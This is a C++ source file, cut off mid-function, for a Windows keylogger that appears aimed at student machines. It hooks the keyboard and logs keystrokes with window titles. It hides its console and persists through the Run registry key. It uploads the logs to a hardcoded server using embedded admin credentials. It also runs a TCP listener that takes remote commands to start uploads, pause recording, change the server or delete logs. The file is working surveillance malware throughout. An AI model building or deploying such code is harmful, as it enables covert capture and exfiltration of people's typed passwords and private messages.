#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <regex>
#include <algorithm>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <cstring>
#include <cstdio>
#include <sstream>
#include <time.h>
#include <map>
#include <shlwapi.h>
#include <shellapi.h>
#include <atomic>
#include <shlobj.h>
#include <objbase.h>
#include <shobjidl.h>
#include <thread>
#include <mutex>
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

#define invisible
#define bootwait
#define FORMAT 0
#define mouseignore

bool isRecording = true;
HHOOK _hook;

std::atomic<bool> uploadEnabled{ false };
std::atomic<bool> uploadThreadRunning{ false };
HANDLE hUploadThread = NULL;

std::atomic<bool> serverControlEnabled{ true };
std::atomic<bool> serverThreadRunning{ false };
HANDLE hServerThread = NULL;
std::string g_serverHost = "10.88.202.73";
int g_serverPort = 5244;
int g_localPort = 9999;
std::mutex g_configMutex;

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s);
std::string readFileContent(const std::string& filePath);
std::string getExecutableDir();

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]" },
    {VK_RETURN, "\n" },
    {VK_SPACE, "_" },
    {VK_TAB, "[TAB]" },
    {VK_SHIFT, "[SHIFT]" },
    {VK_LSHIFT, "[LSHIFT]" },
    {VK_RSHIFT, "[RSHIFT]" },
    {VK_CONTROL, "[CONTROL]" },
    {VK_LCONTROL, "[LCONTROL]" },
    {VK_RCONTROL, "[RCONTROL]" },
    {VK_MENU, "[ALT]" },
    {VK_LWIN, "[LWIN]" },
    {VK_RWIN, "[RWIN]" },
    {VK_ESCAPE, "[ESCAPE]" },
    {VK_END, "[END]" },
    {VK_HOME, "[HOME]" },
    {VK_LEFT, "[LEFT]" },
    {VK_RIGHT, "[RIGHT]" },
    {VK_UP, "[UP]" },
    {VK_DOWN, "[DOWN]" },
    {VK_PRIOR, "[PG_UP]" },
    {VK_NEXT, "[PG_DOWN]" },
    {VK_OEM_PERIOD, "." },
    {VK_DECIMAL, "." },
    {VK_OEM_PLUS, "+" },
    {VK_OEM_MINUS, "-" },
    {VK_ADD, "+" },
    {VK_SUBTRACT, "-" },
    {VK_CAPITAL, "[CAPSLOCK]" },
};
#endif

static HWND g_hNotifyWnd = NULL;
static UINT g_nNotifyId = 0;

LRESULT CALLBACK NotifyWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    return DefWindowProc(hWnd, msg, wParam, lParam);
}

void InitNotifyWindow()
{
    if (g_hNotifyWnd != NULL) return;
    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = NotifyWndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"KeyloggerNotifyClass";
    RegisterClass(&wc);
    g_hNotifyWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, wc.hInstance, NULL);
    if (g_hNotifyWnd) g_nNotifyId = (UINT)(ULONG_PTR)g_hNotifyWnd;
}

void ShowToastNotification(const std::wstring& title, const std::wstring& content)
{
    InitNotifyWindow();
    if (!g_hNotifyWnd)
    {
        MessageBox(NULL, content.c_str(), title.c_str(), MB_OK);
        return;
    }

    NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
    nid.hWnd = g_hNotifyWnd;
    nid.uID = g_nNotifyId;
    nid.uFlags = NIF_ICON | NIF_TIP | NIF_INFO;
    nid.dwInfoFlags = NIIF_INFO;
    wcscpy_s(nid.szInfo, content.c_str());
    wcscpy_s(nid.szInfoTitle, title.c_str());
    nid.hIcon = LoadIcon(NULL, IDI_APPLICATION);

    if (!Shell_NotifyIconW(NIM_ADD, &nid))
    {
        Shell_NotifyIconW(NIM_MODIFY, &nid);
    }
    else
    {
        struct DelayedCleanupData {
            HWND hWnd;
            UINT uID;
        } *pData = new DelayedCleanupData{ g_hNotifyWnd, g_nNotifyId };
        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID p) -> DWORD {
            DelayedCleanupData* data = (DelayedCleanupData*)p;
            Sleep(10000);
            NOTIFYICONDATAW delNid = { sizeof(NOTIFYICONDATAW) };
            delNid.hWnd = data->hWnd;
            delNid.uID = data->uID;
            Shell_NotifyIconW(NIM_DELETE, &delNid);
            delete data;
            return 0;
            }, pData, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
}

void CleanupNotifyIcon()
{
    if (g_hNotifyWnd)
    {
        NOTIFYICONDATAW nid = { sizeof(NOTIFYICONDATAW) };
        nid.hWnd = g_hNotifyWnd;
        nid.uID = g_nNotifyId;
        Shell_NotifyIconW(NIM_DELETE, &nid);
        DestroyWindow(g_hNotifyWnd);
        g_hNotifyWnd = NULL;
    }
}

KBDLLHOOKSTRUCT kbdStruct;
int Save(int key_stroke);
std::ofstream output_file;

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore 
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0;
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);

            output << "\n\n[Window: " << window_title << " - at " << s << "] " << "\n";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    output_file << output.str();
    output_file.flush();

    std::cout << output.str();

    return 0;
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

const wchar_t* REG_RUN_PATH = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t* APP_NAME = L"MyKeylogger";

std::wstring GetModulePath()
{
    wchar_t path[MAX_PATH] = { 0 };
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

bool IsAutoStartEnabled()
{
    HKEY hKey;
    bool enabled = false;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        wchar_t value[MAX_PATH];
        DWORD size = sizeof(value);
        if (RegQueryValueExW(hKey, APP_NAME, NULL, NULL, (LPBYTE)value, &size) == ERROR_SUCCESS)
        {
            enabled = (GetModulePath() == value);
        }
        RegCloseKey(hKey);
    }
    return enabled;
}

bool SetAutoStart(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;

    bool result = false;
    if (enable)
    {
        std::wstring path = GetModulePath();
        result = (RegSetValueExW(hKey, APP_NAME, 0, REG_SZ, (BYTE*)path.c_str(), (DWORD)((path.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS);
    }
    else
    {
        result = (RegDeleteValueW(hKey, APP_NAME) == ERROR_SUCCESS);
    }
    RegCloseKey(hKey);
    return result;
}

const wchar_t* SILENT_MODE_VALUE = L"SilentMode";

bool IsSilentMode()
{
    HKEY hKey;
    DWORD value = 0, size = sizeof(value);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExW(hKey, SILENT_MODE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return value == 1;
        }
        RegCloseKey(hKey);
    }
    return false;
}

bool SetSilentMode(bool enable)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD value = enable ? 1 : 0;
    bool result = (RegSetValueExW(hKey, SILENT_MODE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return result;
}

// 录制状态注册表项
const wchar_t* RECORDING_STATE_VALUE = L"RecordingState";

// 获取保存的录制状态
bool GetSavedRecordingState()
{
    HKEY hKey;
    DWORD value = 1, size = sizeof(value); // 默认开始录制
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_READ, &hKey) == ERROR_SUCCESS)
    {
        if (RegQueryValueExW(hKey, RECORDING_STATE_VALUE, NULL, NULL, (LPBYTE)&value, &size) == ERROR_SUCCESS)
        {
            RegCloseKey(hKey);
            return value == 1;
        }
        RegCloseKey(hKey);
    }
    return true; // 默认开始录制
}

// 保存录制状态
bool SaveRecordingState(bool isRecording)
{
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_RUN_PATH, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return false;
    DWORD value = isRecording ? 1 : 0;
    bool result = (RegSetValueExW(hKey, RECORDING_STATE_VALUE, 0, REG_DWORD, (BYTE*)&value, sizeof(value)) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return result;
}

std::string GetLocalIPAddress()
{
    std::string ip = "unknown";
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return ip;

    char hostname[256] = { 0 };
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
    {
        WSACleanup();
        return ip;
    }

    struct addrinfo hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    struct addrinfo* result = nullptr;
    if (getaddrinfo(hostname, NULL, &hints, &result) != 0)
    {
        WSACleanup();
        return ip;
    }

    std::string fallback_ip = "unknown";

    for (struct addrinfo* ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        if (ptr->ai_family == AF_INET)
        {
            char ipstr[INET_ADDRSTRLEN] = { 0 };
            sockaddr_in* sa = (sockaddr_in*)ptr->ai_addr;
            InetNtopA(AF_INET, &sa->sin_addr, ipstr, INET_ADDRSTRLEN);
            std::string candidate(ipstr);

            if (candidate.rfind("10.88.", 0) == 0)
            {
                ip = candidate;
                break;
            }

            if (candidate != "127.0.0.1" && !candidate.empty() && fallback_ip == "unknown")
            {
                fallback_ip = candidate;
            }
        }
    }

    freeaddrinfo(result);
    WSACleanup();

    if (ip == "unknown")
    {
        ip = fallback_ip;
    }

    return ip;
}

std::string GetDateString()
{
    char buf[32] = { 0 };
    time_t t = time(NULL);
    struct tm tm_info;
    localtime_s(&tm_info, &t);
    strftime(buf, sizeof(buf), "%Y%m%d", &tm_info);
    return std::string(buf);
}

std::string GetLogDirectory()
{
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, path)))
    {
        std::wstring appdata(path);
        std::wstring logDirW = appdata + L"\\Keylogger";
        if (!fs::exists(logDirW))
        {
            fs::create_directories(logDirW);
        }
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), NULL, 0, NULL, NULL);
        std::string logDir(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, logDirW.c_str(), (int)logDirW.length(), &logDir[0], size_needed, NULL, NULL);
        return logDir;
    }
    return ".\\";
}

std::string MakeOutputFilename()
{
    std::string ip = GetLocalIPAddress();
    for (char& c : ip)
    {
        if (c == '/' || c == '\\' || c == ':' || c == '*' || c == '?' || c == '\"' || c == '<' || c == '>' || c == '|')
            c = '-';
    }
    std::string date = GetDateString();
    std::string filename = ip + "_" + date + ".log";
    std::string logDir = GetLogDirectory();
    return logDir + "\\" + filename;
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    }
    catch (std::bad_alloc& e) {
        return 0;
    }
    return newLength;
}

std::string readFileContent(const std::string& filePath) {
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Cannot open file: " << filePath << std::endl;
        return "";
    }
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::string buffer(size, '\0');
    if (!file.read(&buffer[0], size)) {
        std::cerr << "Failed to read file: " << filePath << std::endl;
        return "";
    }
    return buffer;
}

std::string getExecutableDir() {
    char exePath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0) {
        std::cerr << "Failed to get program path, error: " << GetLastError() << std::endl;
        return "";
    }
    std::string path(exePath, len);
    size_t lastSlash = path.find_last_of("\\/");
    return (lastSlash != std::string::npos) ? path.substr(0, lastSlash + 1) : "";
}

std::string findLatestLogFile(const std::string& dir) {
    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
        std::cerr << "Directory not found or invalid: " << dir << std::endl;
        return "";
    }

    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
    std::smatch match;

    std::vector<std::pair<std::string, std::string>> validLogs;

    for (const auto& entry : fs::directory_iterator(dir)) {
        if (entry.is_regular_file()) {
            std::string fileName = entry.path().filename().string();
            if (std::regex_match(fileName, match, logPattern)) {
                std::string dateStr = match[2].str();
                validLogs.emplace_back(fileName, dateStr);
                std::cout << "Found log file: " << fileName << ", date: " << dateStr << std::endl;
            }
        }
    }

    if (validLogs.empty()) {
        std::cerr << "No log files found (<IP>_<YYYYMMDD>.log)" << std::endl;
        return "";
    }

    std::sort(validLogs.begin(), validLogs.end(),
        [](const auto& a, const auto& b) {
            return a.second > b.second;
        });

    return dir + "\\" + validLogs[0].first;
}

// 删除指定的日志文件
bool deleteLogFile(const std::string& dir, const std::string& fileName) {
    // 验证文件名格式
    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
    if (!std::regex_match(fileName, logPattern)) {
        std::cerr << "Invalid log file name: " << fileName << std::endl;
        return false;
    }

    std::string filePath = dir + "\\" + fileName;

    // 检查文件是否存在
    if (!fs::exists(filePath)) {
        std::cerr << "Log file not found: " << filePath << std::endl;
        return false;
    }

    // 检查是否是常规文件
    if (!fs::is_regular_file(filePath)) {
        std::cerr << "Not a regular file: " << filePath << std::endl;
        return false;
    }

    // 尝试删除文件
    try {
        // 先设置文件属性为正常（防止文件被标记为只读）
        SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);

        // 删除文件
        if (fs::remove(filePath)) {
            std::cout << "Successfully deleted log file: " << fileName << std::endl;
            return true;
        }
        else {
            std::cerr << "Failed to delete log file: " << fileName << std::endl;
            return false;
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Exception when deleting file: " << e.what() << std::endl;
        return false;
    }
}

// 获取日志文件数量和详细信息
json getLogFilesInfo(const std::string& dir) {
    json result;
    result["total_count"] = 0;
    result["total_size"] = 0;
    result["files"] = json::array();

    if (dir.empty() || !fs::exists(dir) || !fs::is_directory(dir)) {
        return result;
    }

    std::regex logPattern(R"((\d+\.\d+\.\d+\.\d+)_(\d{8})\.log)");
    std::smatch match;

    std::vector<std::tuple<std::string, std::string, uintmax_t>> validLogs;

    for (const auto& entry : fs::directory_iterator(dir)) {
        if (entry.is_regular_file()) {
            std::string fileName = entry.path().filename().string();
            if (std::regex_match(fileName, match, logPattern)) {
                std::string dateStr = match[2].str();
                uintmax_t fileSize = entry.file_size();
                validLogs.emplace_back(fileName, dateStr, fileSize);
            }
        }
    }

    // 按日期降序排序（最新的在前）
    std::sort(validLogs.begin(), validLogs.end(),
        [](const auto& a, const auto& b) {
            return std::get<1>(a) > std::get<1>(b);
        });

    result["total_count"] = validLogs.size();

    uintmax_t totalSize = 0;
    for (const auto& log : validLogs) {
        json fileInfo;
        fileInfo["name"] = std::get<0>(log);
        fileInfo["date"] = std::get<1>(log);
        fileInfo["size"] = std::get<2>(log);
        totalSize += std::get<2>(log);
        result["files"].push_back(fileInfo);
    }
    result["total_size"] = totalSize;

    return result;
}

std::string api_get() {
    CURL* curl = curl_easy_init();
    std::string response_string;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
        std::string url = "http://" + g_serverHost + ":" + std::to_string(g_serverPort) + "/api/auth/login";
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        const char* data = R"({"username": "admin", "password": "adm1n5"})";
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Login request failed: " << curl_easy_strerror(res) << std::endl;
        }
        else {
            try {
                json j = json::parse(response_string);
                if (j["code"] == 200 && j["data"].contains("token")) {
                    return j["data"]["token"];
                }
                else {
                    std::cerr << "Login failed: " << response_string << std::endl;
                }
            }
            catch (const std::exception& e) {
                std::cerr << "Failed to parse login response: " << e.what() << std::endl;
            }
        }
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    return "";
}

bool uploadFile(const std::string& token, const std::string& localFilePath, const std::string& serverFilePath)
{
    if (token.empty()) {
        std::cerr << "Token is empty, cannot upload" << std::endl;
        return false;
    }

    std::string fileContent = readFileContent(localFilePath);
    if (fileContent.empty()) {
        return false;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl init failed" << std::endl;
        return false;
    }

    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "PUT");
    std::string url = "http://" + g_serverHost + ":" + std::to_string(g_serverPort) + "/api/fs/put";
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    struct curl_slist* headers = NULL;
    headers = curl_slist_append(headers, ("Authorization: " + token).c_str());
    headers = curl_slist_append(headers, ("File-Path: " + serverFilePath).c_str());
    headers = curl_slist_append(headers, ("Content-Length: " + std::to_string(fileContent.size())).c_str());
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fileContent.data());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, fileContent.size());

    std::string response;
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        std::cerr << "Upload failed: " << curl_easy_strerror(res) << std::endl;
        return false;
    }
    std::cout << "Upload response: " << response << std::endl;
    return true;
}

void uploadLatestLog()
{
    std::string token = api_get();
    if (token.empty()) {
        std::cerr << "Failed to get token, cancel upload" << std::endl;
        return;
    }

    std::string logDir = GetLogDirectory();
    if (logDir.empty()) return;

    std::string latestLogPath = findLatestLogFile(logDir);
    if (latestLogPath.empty()) return;

    fs::path logPath(latestLogPath);
    std::string fileName = logPath.filename().string();
    std::string serverFile = "/%E5%AD%A6%E7%94%9F%E7%9B%AE%E5%BD%95/log/" + fileName;

    bool success = uploadFile(token, latestLogPath, serverFile);
    if (!success) {
        std::cerr << "Upload failed" << std::endl;
    }
}

DWORD WINAPI UploadThreadFunc(LPVOID lpParam)
{
    while (uploadEnabled && uploadThreadRunning)
    {
        uploadLatestLog();
        for (int i = 0; i < 300 && uploadEnabled && uploadThreadRunning; ++i)
            Sleep(1000);
    }
    uploadThreadRunning = false;
    return 0;
}

std::string ProcessCommand(const std::string& command)
{
    json response;
    response["status"] = "ok";

    try {
        json cmd = json::parse(command);
        std::string action = cmd.value("action", "");

        if (action == "ping") {
            response["type"] = "pong";
            response["data"]["recording"] = isRecording;
            response["data"]["upload_enabled"] = uploadEnabled.load();
            response["data"]["local_port"] = g_localPort;
            response["data"]["ip"] = GetLocalIPAddress();
        }
        else if (action == "start_upload") {
            if (!uploadEnabled) {
                uploadEnabled = true;
                uploadThreadRunning = true;
                hUploadThread = CreateThread(NULL, 0, UploadThreadFunc, NULL, 0, NULL);
                if (hUploadThread) CloseHandle(hUploadThread);
            }
            response["type"] = "upload_started";
        }
        else if (action == "stop_upload") {
            uploadEnabled = false;
            uploadThreadRunning = false;
            response["type"] = "upload_stopped";
        }
        else if (action == "upload_once") {
            uploadLatestLog();
            response["type"] = "upload_completed";
        }
        else if (action == "pause_record") {
            isRecording = false;
            SaveRecordingState(isRecording);
            response["type"] = "record_paused";
        }
        else if (action == "resume_record") {
            isRecording = true;
            SaveRecordingState(isRecording);
            response["type"] = "record_resumed";
        }
        else if (action == "get_status") {
            response["type"] = "status";
            response["data"]["recording"] = isRecording;
            response["data"]["upload_enabled"] = uploadEnabled.load();
            response["data"]["local_port"] = g_localPort;
            response["data"]["ip"] = GetLocalIPAddress();
            response["data"]["log_dir"] = GetLogDirectory();
        }
        else if (action == "get_logs_info") {
            response["type"] = "logs_info";
            std::string logDir = GetLogDirectory();
            response["data"] = getLogFilesInfo(logDir);
        }
        else if (action == "set_server") {
            std::lock_guard<std::mutex> lock(g_configMutex);
            if (cmd.contains("host")) {
                g_serverHost = cmd["host"].get<std::string>();
            }
            if (cmd.contains("port")) {
                g_serverPort = cmd["port"].get<int>();
            }
            response["type"] = "server_configured";
            response["data"]["host"] = g_serverHost;
            response["data"]["port"] = g_serverPort;
        }
        else if (action == "delete_log") {
            if (cmd.contains("file")) {
                std::string fileName = cmd["file"].get<std::string>();
                std::string logDir = GetLogDirectory();
                bool success = deleteLogFile(logDir, fileName);
                response["type"] = "log_deleted";
                response["data"]["success"] = success;
                response["data"]["file"] = fileName;
            }
            else {
                response["status"] = "error";
                response["message"] = "Missing 'file' parameter";
            }
        }
        else {
            response["status"] = "error";
            response["message"] = "unknown action";
        }
    }
    catch (const std::exception& e) {
        response["status"] = "error";
        response["message"] = e.what();
    }

    return response.dump();
}

void HandleClient(SOCKET clientSocket)
{
    char buffer[4096];
    std::string accumulated;

    std::cout << "Client connected, socket: " << clientSocket << std::endl;

    // 设置接收超时
    DWORD timeout = 30000; // 30秒
    setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    while (serverControlEnabled) {
        int received = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (received == 0) {
            std::cout << "Client closed connection gracefully" << std::endl;
            break;
        }
        if (received < 0) {
            int error = WSAGetLastError();
            if (error == WSAETIMEDOUT) {
                std::cout << "Receive timeout, continuing..." << std::endl;
                continue;
            }
            if (error == WSAEWOULDBLOCK) {
                Sleep(100);
                continue;
            }
            std::cout << "Client disconnected, error code: " << error << std::endl;
            break;
        }

        buffer[received] = '\0';
        std::cout << "Received " << received << " bytes: " << buffer << std::endl;
        accumulated += buffer;

        size_t pos;
        while ((pos = accumulated.find('\n')) != std::string::npos) {
            std::string command = accumulated.substr(0, pos);
            accumulated = accumulated.substr(pos + 1);

            if (!command.empty()) {
                std::cout << "Processing command: " << command << std::endl;
                std::string response = ProcessCommand(command);
                response += "\n";
                std::cout << "Sending response: " << response << std::endl;
                int sent = send(clientSocket, response.c_str(), (int)response.length(), 0);
                if (sent == SOCKET_ERROR) {
                    int sendError = WSAGetLastError();
                    std::cerr << "Failed to send response, error: " << sendError << std::endl;
                }
                else {
                    std::cout << "Sent " << sent << " bytes" << std::endl;
                }
            }
        }
    }

    closesocket(clientSocket);
    std::cout << "Client connection closed" << std::endl;
}

DWORD WINAPI ServerThreadFunc(LPVOID lpParam)
{
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return 1;
    }

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create listen socket" << std::endl;
        WSACleanup();
        return 1;
    }

    int reuse = 1;
    setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(g_localPort);

    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Failed to bind port " << g_localPort << ", error: " << WSAGetLastError() << std::endl;
        std::cerr << "Trying dynamic port..." << std::endl;

        serverAddr.sin_port = 0;
        if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cerr << "Failed to bind dynamic port, error: " << WSAGetLastError() << std::endl;
            closesocket(listenSocket);
            WSACleanup();
            return 1;
        }
    }

    sockaddr_in boundAddr;
    int addrLen = sizeof(boundAddr);
    getsockname(listenSocket, (sockaddr*)&boundAddr, &addrLen);
    g_localPort = ntohs(boundAddr.sin_port);

    std::cout << "Server listening on port: " << g_localPort << std::endl;

    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen failed" << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    while (serverControlEnabled && serverThreadRunning) {
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(listenSocket, &readSet);

        timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        int result = select(0, &readSet, NULL, NULL, &timeout);
        if (result == SOCKET_ERROR) {
            std::cerr << "select() failed, error: " << WSAGetLastError() << std::endl;
            Sleep(1000);
            continue;
        }

        if (result > 0 && FD_ISSET(listenSocket, &readSet)) {
            sockaddr_in clientAddr;
            int clientAddrLen = sizeof(clientAddr);
            SOCKET clientSocket = accept(listenSocket, (sockaddr*)&clientAddr, &clientAddrLen);
            if (clientSocket != INVALID_SOCKET) {
                char clientIp[INET_ADDRSTRLEN];
                InetNtopA(AF_INET, &clientAddr.sin_addr, clientIp, INET_ADDRSTRLEN);
                std::cout << "New connection from: " << clientIp << ":" << ntohs(clientAddr.sin_port) << std::endl;

                std::thread clientThread(HandleClient, clientSocket);
                clientThread.detach();
            }
            else {
                std::cerr << "accept() failed, error: " << WSAGetLastError() << std::endl;
            }
        }
    }

    closesocket(listenSocket);
    WSACleanup();
    serverThreadRunning = false;
    std::cout << "Server thread stopped" << std::endl;
    return 0;
}

void StartServerControl()
{
    if (!serverThreadRunning) {
        serverThreadRunning = true;
        serverControlEnabled = true;
        hServerThread = CreateThread(NULL, 0, ServerThreadFunc, NULL, 0, NULL);
        if (hServerThread) {
            CloseHandle(hServerThread);
        }
    }
}

void StopServerControl()
{
    serverControlEnabled = false;
    serverThreadRunning = false;
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                isRecording = !isRecording;
                // 保存录制状态到注册表
                SaveRecordingState(isRecording);

                if (isRecording)
                {
                    std::cout << "Recording resumed\n";
                    ShowToastNotification(L"录制已继续", L"状态");
                }
                else
                {
                    std::cout << "Recording paused\n";
                    ShowToastNotification(L"录制已暂停", L"状态");
                }
            }
            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                ShowToastNotification(L"录制已停止", L"状态");
                std::cout << "Recording stopped\n";
                Sleep(2000);
                StopServerControl();
                CleanupNotifyIcon();
                ReleaseHook();
                output_file.close();
                exit(0);
            }
            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool enabled = IsAutoStartEnabled();
                if (SetAutoStart(!enabled))
